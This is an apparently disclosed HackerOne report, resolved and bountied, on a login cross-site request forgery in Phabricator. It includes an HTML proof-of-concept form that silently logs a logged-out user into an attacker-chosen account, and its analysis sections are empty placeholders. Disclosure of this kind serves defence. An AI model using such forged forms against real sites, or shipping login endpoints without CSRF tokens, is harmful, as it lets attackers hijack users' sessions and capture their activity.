---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '774'
original_report_id: '774'
title: Log in a user to another account
weakness: Cross-Site Request Forgery (CSRF)
team_handle: phabricator
created_at: '2014-01-23T12:54:26.529Z'
disclosed_at: '2014-02-22T22:21:32.666Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 17
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Log in a user to another account

## Metadata

- HackerOne Report ID: 774
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: phabricator
- Disclosed At: 2014-02-22T22:21:32.666Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

It is possible to log in the user to another account (no CSRF token). POC (for demonstration purposes with Submit button; normally sent automatically):

<html>
  <body>
    <form action="http://DOMAIN-WITH-PHABRICATOR/auth/login/password:self/" method="POST">
      <input type="hidden" name="&#95;&#95;dialog&#95;&#95;" value="1" />
      <input type="hidden" name="username" value="user3" />
      <input type="hidden" name="password" value="password3" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

The user needs to be logged out, when the aforementioned request is submitted. It is assumed that user3 with password3 exists.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
